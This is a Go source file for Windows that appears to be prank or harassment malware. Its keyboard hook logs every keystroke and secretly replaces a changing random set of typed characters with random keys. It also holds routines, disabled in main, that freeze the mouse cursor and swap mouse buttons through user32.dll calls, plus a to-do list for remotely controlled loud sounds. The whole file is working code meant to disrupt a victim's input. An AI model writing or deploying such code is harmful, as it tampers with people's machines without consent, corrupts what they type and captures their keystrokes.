package main

import (
	"crypto/rand"
	"fmt"
	"math/big"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/kindlyfire/go-keylogger"
	"github.com/micmonay/keybd_event"
)

/*
	ToDo:
	Move mouse cursor
	Max volume with random sound/preprogrammed sound (maybe remotely controlled)
*/

type BOOL int32
type POINT struct {
	X, Y int32
}

const (
	delayCursorfetchMS = 1
	delayKeyfetchMS = 1
	keyReplaceCount = 15
	keyReplaceChangeDelayS = 5
)

var (
	moduser32 = syscall.NewLazyDLL("user32.dll")

	procSwapMouseButton = moduser32.NewProc("SwapMouseButton")
	procSetCursorPos 	= moduser32.NewProc("SetCursorPos")
	procGetCursorPos 	= moduser32.NewProc("GetCursorPos")

	keysToReplace []string
	keysToReplacePTR *[]string = &keysToReplace
	mut *sync.Mutex
)

func main() {
	//go blockMouseCursor()
	//go swapMouseButtons()
	go changeKeysToReplace()
	replaceKeyboard()
}

// ---------------------- **THIS SECTION IMPLEMENTS A FUNCTION TO PERIODICALLY BLOCK THE CURSOR** -----------------------

func blockMouseCursor() {
	for {
		nBig, err := rand.Int(rand.Reader, big.NewInt(120))
		if err != nil {
			continue
		}
		blockTimeout := time.Second * time.Duration(nBig.Int64())

		time.Sleep(blockTimeout)

		oldX, oldY, ok := getCursorPos()
		if ! ok {
			oldX, oldY, ok = getCursorPos()
			if ! ok {
				return
			}
		}

		nBig, err = rand.Int(rand.Reader, big.NewInt(15))
		if err != nil {
			continue
		}

		blockTimeS := int(nBig.Int64())
		startTime := time.Now()
		endTime := startTime.Add(time.Second * time.Duration(blockTimeS))

		for time.Now().Before(endTime) {
			time.Sleep(delayCursorfetchMS * time.Millisecond)
			newX, newY, ok := getCursorPos()
			if ! ok {
				continue
			}
			if newX != oldX || newY != oldY {
				setCursorPos(oldX, oldY)
			}
		}
	}
}

// --------------------- **THIS SECTION IMPLEMENTS A FUNCTION TO PERIODICALLY SWAP MOUSE BUTTONS** ----------------------

func swapMouseButtons() {
	for {
		nBig, err := rand.Int(rand.Reader, big.NewInt(60))
		if err != nil {
			continue
		}
		swapMouseButton(true)
		time.Sleep(time.Duration(nBig.Int64()) * time.Second)
		swapMouseButton(false)

		nBig, err = rand.Int(rand.Reader, big.NewInt(60))
		if err != nil {
			continue
		}
		time.Sleep(time.Duration(nBig.Int64()) * time.Second)
	}
}

// --------------------------- **THIS SECTION IMPLEMENTS FUNCTIONS TO MODIFY KEYBOARD INPUT** ---------------------------

// Replaces the keys defined by changeKeysToReplace() with random keys generated by randomKeyReplace()
func replaceKeyboard() {
	kl := keylogger.NewKeylogger()
	var keyruneString string

	kb, err := keybd_event.NewKeyBonding()
	if err != nil {
		return
	}

	for {
		key := kl.GetKey()

		if ! key.Empty {
			keyruneString = fmt.Sprintf("%c", key.Rune)
			fmt.Printf(keyruneString)

			if sliceStringContains(keyruneString, *keysToReplacePTR) {
				kb.SetKeys(keybd_event.VK_BACKSPACE, randomKeyReplace())
				err = kb.Launching()
				if err != nil {
					// Ignore
				}
			}
		}

		time.Sleep(delayKeyfetchMS * time.Millisecond)
	}
}

// Changes the keys that are being replaced by replaceKeyboard() periodically
func changeKeysToReplace() {
	pKeys := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789?![]{}-_.:,;()/|&%*#+"
	pKeySlice := strings.Split(pKeys, "")

	for {
		var keys []string

		for i := 0; i <= keyReplaceCount; i++ {
			nBig, err := rand.Int(rand.Reader, big.NewInt(int64(len(pKeySlice) -1)))
			if err != nil {
				continue
			}
			keys = append(keys, pKeySlice[nBig.Int64()])
		}

		keysToReplacePTR = &keys

		time.Sleep(keyReplaceChangeDelayS * time.Second)
	}
}

// Chooses a random keyboard event in pKeys and returns it
func randomKeyReplace() (keyBoardEvent int) {
	pKeys := [41]int{keybd_event.VK_A, keybd_event.VK_B, keybd_event.VK_C, keybd_event.VK_D, keybd_event.VK_E, keybd_event.VK_F, keybd_event.VK_G,
	keybd_event.VK_H, keybd_event.VK_I, keybd_event.VK_J, keybd_event.VK_K, keybd_event.VK_L, keybd_event.VK_M, keybd_event.VK_N, keybd_event.VK_O,
	keybd_event.VK_P, keybd_event.VK_Q, keybd_event.VK_R, keybd_event.VK_S, keybd_event.VK_T, keybd_event.VK_U, keybd_event.VK_V, keybd_event.VK_W,
	keybd_event.VK_X, keybd_event.VK_Y, keybd_event.VK_Z, keybd_event.VK_BACKSLASH, keybd_event.VK_RIGHTBRACE, keybd_event.VK_LEFTBRACE, keybd_event.VK_ENTER,
	keybd_event.VK_ESC, keybd_event.VK_0, keybd_event.VK_1, keybd_event.VK_2, keybd_event.VK_3, keybd_event.VK_4, keybd_event.VK_5, keybd_event.VK_6,
	keybd_event.VK_7, keybd_event.VK_8, keybd_event.VK_9}

	nBig, err := rand.Int(rand.Reader, big.NewInt(int64(len(pKeys) -1)))
	if err != nil {
		keyBoardEvent = keybd_event.VK_ENTER
		return
	}
	keyBoardEvent = pKeys[nBig.Int64()]
	return
}

// ----------------------------------- **THIS SECTION IMPLEMENTS WIN32 API SYSCALLS** -----------------------------------

func swapMouseButton(fSwap bool) bool {
	ret, _, _ := procSwapMouseButton.Call(
		uintptr(boolToBOOL(fSwap)))
	return ret != 0
}

func getCursorPos() (x, y int, ok bool) {
	pt := POINT{}
	ret, _, _ := procGetCursorPos.Call(uintptr(unsafe.Pointer(&pt)))
	return int(pt.X), int(pt.Y), ret != 0
}

func setCursorPos(x, y int) bool {
	ret, _, _ := procSetCursorPos.Call(
		uintptr(x),
		uintptr(y),
	)
	return ret != 0
}

// ------------------------------------ **THIS SECTION IMPLEMENTS HELPER FUNCTIONS** ------------------------------------

func sliceStringContains(value string, slice []string) (bool) {
	for _, v := range slice {
		if v == value {
			return true
		}
	}
	return false
}

func boolToBOOL(value bool) BOOL {
	if value {
		return 1
	}

	return 0
}